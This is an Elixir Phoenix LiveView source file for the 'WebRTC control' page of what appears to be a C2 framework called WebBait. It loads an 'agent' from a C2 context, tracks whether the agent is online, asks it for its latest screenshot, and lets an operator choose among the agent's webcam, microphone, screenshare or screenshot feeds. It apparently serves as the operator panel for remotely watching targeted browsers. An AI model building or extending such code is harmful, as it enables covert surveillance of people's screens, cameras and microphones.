defmodule WebBaitWeb.AgentLive.Webrtc do
  use WebBaitWeb, :live_view
  alias WebBait.C2
  alias WebbaitWeb.AgentLive.OnlineStatusComponent
  alias WebBaitWeb.AgentLive.TheaterModeComponent

  @impl true
  def mount(%{"id" => id}, _session, socket) do
    agent = C2.get_agent!(id)

    if connected?(socket) do
      Phoenix.PubSub.subscribe(WebBait.PubSub, "agents:#{agent.agentId}")
      Phoenix.PubSub.subscribe(WebBait.PubSub, "agents:presence")
    end

    {
      :ok,
      socket
      |> assign(:devices, [])
      |> assign(:online, false)
      |> assign(:count, 0)
      |> assign(:agent, agent)
      |> assign(:activeSources, [])
      |> assign(:pinnedSource, "screenshot")
    }
  end

  @impl true
  def handle_params(_, _, socket) do
    Phoenix.PubSub.broadcast(
      WebBait.PubSub,
      "agent:#{socket.assigns.agent.agentId}",
      "send-lastScreenshot"
    )

    {:noreply,
     socket
     |> assign(:page_title, page_title(socket.assigns.live_action))}
  end

  defp page_title(:index), do: "WebRTC control"

  defp page_title(:theater), do: "WebRTC control (Theater mode)"

  def nice_print_device(%{"label" => label, "kind" => kind}) do
    if label != "",
      do: "#{label} #{nice_print_device_kind(kind)}",
      else: nice_print_device_kind(kind)
  end

  def nice_print_device_kind(kind) do
    case kind do
      "videoinput" -> "(Video Input)"
      "videooutput" -> "(Video Output)"
      "audioinput" -> "(Audio Input)"
      "audiooutput" -> "(Audio Output)"
      _ -> "(#{kind})"
    end
  end

  @impl true
  def handle_event("pin-source", %{"sourceid" => sourceId}, socket) do
    {
      :noreply,
      socket
      |> assign(:pinnedSource, sourceId)
    }
  end

  @impl true
  def handle_info({"devices", devices}, socket) do
    Phoenix.PubSub.broadcast(
      WebBait.PubSub,
      "agent:#{socket.assigns.agent.agentId}",
      "send-lastScreenshot"
    )

    {:noreply,
     socket
     |> assign(:devices, devices)}
  end

  def handle_info(%{event: "presence_diff", payload: diff}, socket) do
    Phoenix.PubSub.broadcast(
      WebBait.PubSub,
      "agent:#{socket.assigns.agent.agentId}",
      "send-lastScreenshot"
    )

    {online, count} =
      WebBait.agentOnlineStatus(diff, socket.assigns.agent.agentId, socket.assigns.count)

    {
      :noreply,
      socket
      |> assign(:online, online)
      |> assign(:count, count)
    }
  end

  def handle_info({"source-activated", sourceId}, socket) do
    Phoenix.PubSub.broadcast(
      WebBait.PubSub,
      "agent:#{socket.assigns.agent.agentId}",
      "send-lastScreenshot"
    )

    pinnedSource =
      if Enum.find(socket.assigns.activeSources, fn source ->
           source == socket.assigns.pinnedSource
         end) do
        socket.assigns.pinnedSource
      else
        "screenshot"
      end

    {
      :noreply,
      socket
      |> assign(:activeSources, socket.assigns.activeSources ++ [sourceId])
      |> assign(:pinnedSource, pinnedSource)
    }
  end

  def handle_info({"source-deactivated", sourceId}, socket) do
    Phoenix.PubSub.broadcast(
      WebBait.PubSub,
      "agent:#{socket.assigns.agent.agentId}",
      "send-lastScreenshot"
    )

    activeSources = Enum.filter(socket.assigns.activeSources, fn sId -> sId != sourceId end)

    pinnedSource =
      if socket.assigns.pinnedSource in activeSources do
        socket.assigns.pinnedSource
      else
        "screenshot"
      end

    {
      :noreply,
      socket
      |> assign(
        :activeSources,
        activeSources
      )
      |> assign(:pinnedSource, pinnedSource)
      |> push_event("source-deactivated", %{"sourceId" => sourceId})
    }
  end

  def pinnedSouceKind(pinnedSource, devices) do
    if pinnedSource == "screenshot" do
      "screenshot"
    else
      if pinnedSource == "screenshare" do
        "video"
      else
        case Enum.find_value(devices, fn device ->
               if device["deviceId"] == pinnedSource, do: device["kind"]
             end) do
          "videoinput" ->
            "video"

          "audioinput" ->
            "audio"

          nil ->
            "screenshot"
        end
      end
    end
  end
end
